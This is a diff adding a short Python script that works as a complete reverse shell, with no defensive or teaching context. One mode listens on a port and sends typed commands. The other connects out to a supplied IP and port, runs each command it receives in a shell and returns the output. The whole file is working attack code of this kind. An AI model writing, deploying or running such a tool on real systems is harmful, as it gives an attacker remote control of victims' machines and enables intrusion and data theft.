@@ -1,0 +1,36 @@
+#!/usr/bin/python3
+# coding:utf-8
+import argparse
+import subprocess
+import socket
+import threading
+import sys
+import time
+
+parser = argparse.ArgumentParser(description='sss')
+parser.add_argument('-n',nargs=1,help='get shell')
+parser.add_argument('-m',nargs=2,help='send shell')
+args = parser.parse_args()
+if args.n:
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.bind(('0.0.0.0',int(args.n[0])))
+    server.listen(1)
+    sock,addr = server.accept()
+    while True:
+        msg = input("#:")
+        sock.send(msg.encode('utf-8'))
+        data = sock.recv(1024)
+        print(data.decode('utf-8'))
+
+if args.m:
+    server_ip = args.m[0]
+    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    client.connect((server_ip,int(args.m[1])))
+    while True:
+        data = client.recv(1024)
+        data = data.decode('utf-8')
+        comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                  stdin=subprocess.PIPE)
+        m_stdout, m_stderr = comRst.communicate()
+        client.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
+        time.sleep(1)
